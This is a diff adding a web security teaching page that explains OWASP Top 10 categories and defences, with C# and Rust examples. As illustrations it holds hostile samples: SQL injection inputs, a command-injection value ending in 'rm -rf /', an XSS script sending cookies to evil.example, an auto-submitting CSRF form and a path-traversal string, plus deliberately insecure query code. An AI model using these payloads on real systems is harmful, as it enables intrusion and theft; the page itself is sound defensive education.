@@ -1,0 +1,358 @@
+---
+title: Web Security
+description: OWASP Top 10, SQL injection and prepared statements, XSS, CSRF and SameSite cookies, CORS, security headers, session management, insecure deserialisation, SSRF and path traversal.
+sidebar:
+  order: 6
+---
+
+import { Tabs, TabItem } from "@astrojs/starlight/components";
+
+Web applications can be reached from the entire internet and process input from anyone. They are therefore the most common target of attacks. Almost all vulnerabilities on this page have the same cause: the application **trusts input** that comes from outside. This leads to the most important principle of web security: every input (form fields, URL parameters, headers, cookies, uploaded files, JSON data from APIs) is potentially malicious and is validated on the server. Checks in the browser with JavaScript are only for convenience; an attacker simply bypasses them.
+
+## OWASP Top 10
+
+The **Open Worldwide Application Security Project** (OWASP) is a non-profit foundation that publishes freely available tools and guides on application security. Its best-known publication, the **OWASP Top 10**, lists the ten most critical risk categories for web applications, based on data from security tests and surveys. The list is updated every few years; the current edition is from 2025. Many teaching materials still refer to the 2021 edition.
+
+| Rank | OWASP Top 10:2025                         | OWASP Top 10:2021                          |
+| ---- | ----------------------------------------- | ------------------------------------------ |
+| A01  | Broken Access Control                     | Broken Access Control                      |
+| A02  | Security Misconfiguration                 | Cryptographic Failures                     |
+| A03  | Software Supply Chain Failures            | Injection                                  |
+| A04  | Cryptographic Failures                    | Insecure Design                            |
+| A05  | Injection                                 | Security Misconfiguration                  |
+| A06  | Insecure Design                           | Vulnerable and Outdated Components         |
+| A07  | Authentication Failures                   | Identification and Authentication Failures |
+| A08  | Software or Data Integrity Failures       | Software and Data Integrity Failures       |
+| A09  | Security Logging and Alerting Failures    | Security Logging and Monitoring Failures   |
+| A10  | Mishandling of Exceptional Conditions     | Server-Side Request Forgery (SSRF)         |
+
+The categories briefly explained:
+
+- **Broken Access Control**: users can access data or functions for which they have no rights. The classic case is **IDOR** (_insecure direct object reference_): whoever may see `/api/invoices/4711` changes the number to `4712` and sees someone else's invoice, because the server only checks the login, not who owns the invoice. SSRF has been part of this category since 2025.
+- **Security Misconfiguration**: default passwords, detailed error messages with stack traces, open cloud storage, unnecessary features.
+- **Software Supply Chain Failures**: vulnerable or manipulated libraries, build tools and packages (see [System Hardening](/en/it-security/system-hardening/#secure-software-development)).
+- **Cryptographic Failures**: unencrypted transmission, outdated algorithms, passwords without salt (see [Cryptography](/en/it-security/cryptography/)).
+- **Injection**: SQL, command or LDAP injection as well as XSS (see below).
+- **Insecure Design**: flaws in the design that no clean implementation can fix, for example a password reset only via security questions.
+- **Authentication Failures**: no protection against brute force, weak passwords, insecure session management.
+- **Software or Data Integrity Failures**: code or data is accepted without an integrity check, for example updates without a signature or insecure deserialisation.
+- **Security Logging and Alerting Failures**: attacks are not logged, or nobody reacts to the alerts.
+- **Mishandling of Exceptional Conditions**: errors and exceptions are handled wrongly, for example when an authorisation check allows access on an exception (_fail open_) instead of denying it.
+
+## SQL injection
+
+In **SQL injection** the application builds an SQL query by concatenating strings with user input. If the input contains SQL syntax, it is executed as part of the command. The query
+
+{/* check: skip */}
+
+```sql
+SELECT name, email FROM users WHERE name = 'input';
+```
+
+becomes, with the input `x' OR '1'='1`, the query
+
+{/* check: skip */}
+
+```sql
+SELECT name, email FROM users WHERE name = 'x' OR '1'='1';
+```
+
+which returns all rows because the condition is always true. With other input an attacker can bypass logins (`admin' --` comments out the password check), read other tables with `UNION SELECT` or, depending on database and rights, modify and delete data.
+
+The solution is **parameterised queries** (_prepared statements_): the SQL statement contains placeholders, and the values are passed to the database separately. The database always treats them as **data**, never as code, no matter which characters they contain. Home-made "escaping" of quotation marks, by contrast, is error-prone.
+
+<Tabs syncKey="code">
+<TabItem label="C#">
+
+```csharp
+using Microsoft.Data.Sqlite;
+
+using var connection = new SqliteConnection("Data Source=:memory:");
+connection.Open();
+using (var setup = connection.CreateCommand())
+{
+    setup.CommandText = """
+        CREATE TABLE users (name TEXT, email TEXT);
+        INSERT INTO users VALUES ('anna', 'anna@example.at'), ('bernd', 'bernd@example.at');
+        """;
+    setup.ExecuteNonQuery();
+}
+
+string input = "x' OR '1'='1"; // the attacker's input
+
+// INSECURE: input is inserted into the SQL text
+using (var unsafeCommand = connection.CreateCommand())
+{
+    unsafeCommand.CommandText = $"SELECT name, email FROM users WHERE name = '{input}'";
+    using var reader = unsafeCommand.ExecuteReader();
+    while (reader.Read())
+        Console.WriteLine($"insecure: {reader.GetString(0)} {reader.GetString(1)}");
+}
+
+// SECURE: placeholder, the value is passed as a parameter
+using (var safeCommand = connection.CreateCommand())
+{
+    safeCommand.CommandText = "SELECT name, email FROM users WHERE name = $name";
+    safeCommand.Parameters.AddWithValue("$name", input);
+    using var reader = safeCommand.ExecuteReader();
+    int count = 0;
+    while (reader.Read()) count++;
+    Console.WriteLine($"secure: {count} matches");
+}
+
+// Output:
+// insecure: anna anna@example.at
+// insecure: bernd bernd@example.at
+// secure: 0 matches
+```
+
+</TabItem>
+<TabItem label="Rust">
+
+```rust
+use rusqlite::{Connection, params};
+
+fn main() -> rusqlite::Result<()> {
+    let connection = Connection::open_in_memory()?;
+    connection.execute_batch(
+        "CREATE TABLE users (name TEXT, email TEXT);
+         INSERT INTO users VALUES ('anna', 'anna@example.at'), ('bernd', 'bernd@example.at');",
+    )?;
+
+    let input = "x' OR '1'='1"; // the attacker's input
+
+    // INSECURE: input is inserted into the SQL text
+    let sql = format!("SELECT name, email FROM users WHERE name = '{input}'");
+    let mut unsafe_query = connection.prepare(&sql)?;
+    let rows = unsafe_query.query_map([], |row| Ok((row.get::<_, String>(0)?, row.get::<_, String>(1)?)))?;
+    for row in rows {
+        let (name, email) = row?;
+        println!("insecure: {name} {email}");
+    }
+
+    // SECURE: placeholder, the value is passed as a parameter
+    let mut safe_query = connection.prepare("SELECT name, email FROM users WHERE name = ?1")?;
+    let count = safe_query.query_map(params![input], |row| row.get::<_, String>(0))?.count();
+    println!("secure: {count} matches");
+    Ok(())
+}
+
+// Output:
+// insecure: anna anna@example.at
+// insecure: bernd bernd@example.at
+// secure: 0 matches
+```
+
+</TabItem>
+</Tabs>
+
+ORMs such as Entity Framework Core use parameters internally and are safe as long as you do not assemble SQL text with user input (for example with `FromSqlRaw` and string concatenation). Placeholders only work for values, not for table or column names. You check these against a fixed list of permitted names (**allowlist**). In addition, a database user with minimal rights limits the damage. More on SQL can be found in the [Databases](/en/databases/) section.
+
+**Command injection** (input ends up in a shell command, for example `ping` with the input `8.8.8.8; rm -rf /`) and **LDAP injection** arise from the same pattern. The defence in each case is to separate data and command: start programs with an argument list instead of via a shell, and validate input strictly.
+
+## Cross-site scripting
+
+In **cross-site scripting** (XSS) an attacker injects their own JavaScript into someone else's website, which then runs in other users' browsers in the context of that site. The script can steal session cookies (unless `HttpOnly`), perform actions on behalf of the victim, record keystrokes or alter the page, for example by showing a fake login form.
+
+| Type               | How it works                                                                                              |
+| ------------------ | --------------------------------------------------------------------------------------------------------- |
+| **Stored XSS**     | The script is stored permanently, for example in a comment, and delivered to every visitor of the page.   |
+| **Reflected XSS**  | The script is in a link (`/search?q=<script>...`), and the server returns the parameter unfiltered in the response. The victim has to click the link. |
+| **DOM-based XSS**  | Client-side JavaScript writes data from the URL or other sources unsafely into the DOM, for example with `innerHTML`. The server is not involved. |
+
+A comment with this content would be executed for every visitor without protection:
+
+```html
+Great article!<script>fetch("https://evil.example/?c=" + document.cookie)</script>
+```
+
+The most important defence is **context-sensitive output encoding**: before data is inserted into HTML, the special characters `<`, `>`, `&`, `"` and `'` are replaced by HTML entities. The browser then displays them as text instead of interpreting them as markup. Attributes, JavaScript code and URLs each have their own rules.
+
+<Tabs syncKey="code">
+<TabItem label="C#">
+
+```csharp
+using System.Net;
+
+string comment = "<script>alert('XSS')</script> & more";
+Console.WriteLine(WebUtility.HtmlEncode(comment));
+
+// Output:
+// &lt;script&gt;alert(&#39;XSS&#39;)&lt;/script&gt; &amp; more
+```
+
+</TabItem>
+<TabItem label="Rust">
+
+```rust
+fn html_encode(text: &str) -> String {
+    let mut result = String::with_capacity(text.len());
+    for c in text.chars() {
+        match c {
+            '<' => result.push_str("&lt;"),
+            '>' => result.push_str("&gt;"),
+            '&' => result.push_str("&amp;"),
+            '"' => result.push_str("&quot;"),
+            '\'' => result.push_str("&#39;"),
+            _ => result.push(c),
+        }
+    }
+    result
+}
+
+fn main() {
+    let comment = "<script>alert('XSS')</script> & more";
+    println!("{}", html_encode(comment));
+}
+
+// Output:
+// &lt;script&gt;alert(&#39;XSS&#39;)&lt;/script&gt; &amp; more
+```
+
+</TabItem>
+</Tabs>
+
+Modern template engines and frameworks (Razor in ASP.NET Core, React, Angular, Askama in Rust) encode output **automatically**. It becomes dangerous when you deliberately bypass this protection, for example with `@Html.Raw(...)`, `dangerouslySetInnerHTML` or `element.innerHTML = ...`. In the browser you use `textContent` instead. If user HTML must be allowed (rich text editor), it is cleaned with a proven library such as DOMPurify (_sanitising_). As a second line of defence, a **Content Security Policy** (see below) prevents injected scripts from running.
+
+## Cross-site request forgery
+
+In **cross-site request forgery** (CSRF) another website makes the logged-in victim's browser send a request to a different application. Because the browser sends cookies automatically, the request appears legitimate:
+
+```html
+<!-- on the attacker's page: submitted automatically on load -->
+<form action="https://bank.example/transfer" method="POST" id="f">
+  <input type="hidden" name="iban" value="AT00ATTACKER">
+  <input type="hidden" name="amount" value="5000">
+</form>
+<script>document.getElementById("f").submit()</script>
+```
+
+Countermeasures:
+
+- **Anti-CSRF token**: the server embeds a random, session-bound value in every form and checks it on every state-changing request. The foreign page does not know the value. ASP.NET Core does this with `[ValidateAntiForgeryToken]` or automatically in Razor Pages.
+- **SameSite cookies**: the cookie attribute `SameSite` controls whether the browser sends a cookie with requests from other sites.
+- Never perform state-changing actions via `GET`, but via `POST`, `PUT` or `DELETE`.
+- For critical actions, require renewed confirmation, for example with a password or second factor.
+
+| `SameSite` value | Behaviour                                                                              |
+| --------------- | -------------------------------------------------------------------------------------- |
+| `Strict`        | cookie only for requests from the same site, not even when clicking a link from outside |
+| `Lax`           | additionally for navigation by link (top-level `GET`), not for `POST` from other sites. Default in current browsers when nothing is specified |
+| `None`          | cookie is always sent, additionally requires `Secure`                                  |
+
+A secure session cookie looks like this:
+
+```http
+Set-Cookie: __Host-session=k3J9xQ...; Path=/; Secure; HttpOnly; SameSite=Lax
+```
+
+`Secure` sends the cookie only over HTTPS, `HttpOnly` makes it invisible to JavaScript (protection against XSS), and the prefix `__Host-` enforces `Secure` and `Path=/` and forbids specifying a domain, so that subdomains cannot overwrite the cookie.
+
+## Same-origin policy and CORS
+
+The browser's **same-origin policy** (SOP) prevents JavaScript on one page from reading the responses of another **origin**. An origin consists of **scheme, host and port**: `https://school.at` and `https://school.at:8443` are different origins, as are `http://school.at` and `https://school.at`. Without the SOP, every website you visit could read your webmail in the background.
+
+**CORS** (_cross-origin resource sharing_) relaxes the SOP in a controlled way. With response headers the server allows certain foreign origins access, for example when the frontend at `https://app.example.at` calls the API at `https://api.example.at`:
+
+```http
+Access-Control-Allow-Origin: https://app.example.at
+Access-Control-Allow-Methods: GET, POST
+Access-Control-Allow-Headers: Content-Type, Authorization
+Access-Control-Allow-Credentials: true
+```
+
+For requests that are not "simple" requests (for example with `Content-Type: application/json` or methods such as `PUT` and `DELETE`), the browser first sends a **preflight request** with the method `OPTIONS` and sends the actual request only if the server agrees. Typical misconfigurations are reflecting every requesting origin unchecked or allowing `null`. The wildcard `*` is not permitted together with `Allow-Credentials: true`. CORS is a mechanism that **grants** access, not a protection: it does not protect against CSRF or against requests that do not come from a browser.
+
+## Security headers
+
+With HTTP response headers the server instructs the browser to activate additional protection mechanisms:
+
+| Header                          | Purpose                                                                               | Example                                     |
+| ------------------------------- | ------------------------------------------------------------------------------------- | ------------------------------------------- |
+| **Content-Security-Policy** (CSP) | defines from which sources scripts, styles, images and frames may be loaded, forbids inline scripts | `default-src 'self'; script-src 'self'; frame-ancestors 'none'` |
+| **Strict-Transport-Security**   | enforces HTTPS (see [HSTS](/en/it-security/pki-and-tls/#https-and-hsts))              | `max-age=31536000; includeSubDomains`       |
+| **X-Frame-Options**             | prevents embedding in foreign frames (**clickjacking**), superseded by `frame-ancestors` in the CSP | `DENY`                         |
+| **X-Content-Type-Options**      | forbids the browser from guessing the content type (_MIME sniffing_)                   | `nosniff`                                   |
+| **Referrer-Policy**             | limits which URL information is passed on to other sites                               | `strict-origin-when-cross-origin`           |
+| **Permissions-Policy**          | switches off browser features such as camera, microphone and location                  | `camera=(), geolocation=()`                 |
+
+In **clickjacking** the attacker loads the real page invisibly in a frame over their own page. The victim believes they are clicking a harmless button but actually clicks "Delete account" in the invisible page. A strict CSP without `'unsafe-inline'` is the most effective second line of defence against XSS. Websites such as the Mozilla HTTP Observatory check a site's headers.
+
+## Session management
+
+HTTP is stateless. After login the browser therefore receives a **session ID**, usually in a cookie, that identifies it on all further requests. Whoever steals it is the logged-in user as far as the server is concerned (**session hijacking**). Rules:
+
+- Generate session IDs with a cryptographically secure random generator, long enough (at least 64 bits of entropy according to OWASP, 128 bits are common), without recognisable structure.
+- Issue a **new** session ID after login. Otherwise an attacker can plant an ID known to them on the victim beforehand (**session fixation**).
+- Set cookies with `Secure`, `HttpOnly` and `SameSite`; never write session IDs into the URL (they end up in logs and in the referrer).
+- End sessions after inactivity and after an absolute maximum duration, and invalidate them **on the server** at logout.
+- Security-relevant changes (password, email address) require renewed authentication.
+
+## Further vulnerabilities
+
+### Insecure deserialisation
+
+**Deserialisation** creates an object from data again (JSON, XML, binary format). If the format allows the **type** of the object to be created to be specified in the data itself, an attacker can have objects of arbitrary classes created. Cleverly combined (_gadget chains_), their constructors or setters execute arbitrary code. Affected were, for example, the `BinaryFormatter` in .NET (removed since .NET 9), `ObjectInputStream` in Java and `pickle` in Python. Defence: deserialise only data from trusted sources, use simple data formats such as JSON with **fixed target types** (`JsonSerializer.Deserialize<Order>(...)` or Serde in Rust) and do not evaluate type information in the data (with Newtonsoft.Json no `TypeNameHandling.All`).
+
+### Server-side request forgery
+
+In **SSRF** the attacker makes the server send requests to addresses of their choosing, for example via a "load image from URL" feature or a webhook. The server usually sits in the internal network and can thus reach services that are blocked from outside: internal admin interfaces, databases or the **metadata service** of cloud servers at `169.254.169.254`, which hands out credentials. Defence: allow only permitted targets (allowlist), block internal and private address ranges after DNS resolution, do not follow redirects automatically and separate the server from the internal network with a firewall.
+
+### Path traversal
+
+In **path traversal** (_directory traversal_) the application uses a file name from the input, for example `/download?file=report.pdf`. With `../../../etc/passwd` the attacker leaves the intended directory and reads arbitrary files. Defence: better to use IDs from a database instead of file names. If a file name is needed, the full path is normalised and checked to see whether it still lies in the permitted directory, or only simple file names without path components are allowed:
+
+<Tabs syncKey="code">
+<TabItem label="C#">
+
+```csharp
+string baseDirectory = Path.GetFullPath("downloads") + Path.DirectorySeparatorChar;
+
+foreach (string fileName in new[] { "report.pdf", "../../../etc/passwd", "/etc/passwd" })
+{
+    // combine and normalise the path (resolves ..)
+    string fullPath = Path.GetFullPath(Path.Combine(baseDirectory, fileName));
+    bool allowed = fullPath.StartsWith(baseDirectory, StringComparison.Ordinal);
+    Console.WriteLine($"{fileName,-20} {(allowed ? "allowed" : "rejected")}");
+}
+
+// Output:
+// report.pdf           allowed
+// ../../../etc/passwd  rejected
+// /etc/passwd          rejected
+```
+
+</TabItem>
+<TabItem label="Rust">
+
+```rust
+use std::path::{Component, Path};
+
+/// allows only relative paths without "..", root or drive prefix
+fn is_safe(file_name: &str) -> bool {
+    Path::new(file_name).components().all(|c| matches!(c, Component::Normal(_)))
+}
+
+fn main() {
+    for file_name in ["report.pdf", "../../../etc/passwd", "/etc/passwd"] {
+        let verdict = if is_safe(file_name) { "allowed" } else { "rejected" };
+        println!("{file_name:<20} {verdict}");
+    }
+}
+
+// Output:
+// report.pdf           allowed
+// ../../../etc/passwd  rejected
+// /etc/passwd          rejected
+```
+
+</TabItem>
+</Tabs>
+
+The C# variant normalises the path and compares the result with the permitted directory. The Rust variant allows only normal path components from the outset. Both approaches are common. Symbolic links in the target directory can, however, bypass such a check, so the application additionally runs with minimal file system rights.
+
+## Further reading
+
+- [OWASP Top 10:2025](https://owasp.org/Top10/2025/) and the [OWASP Cheat Sheet Series](https://cheatsheetseries.owasp.org/)
+- [MDN Web Docs: Web security](https://developer.mozilla.org/en-US/docs/Web/Security) (Mozilla)
+- [PortSwigger Web Security Academy](https://portswigger.net/web-security) (free practice labs for all vulnerabilities on this page)
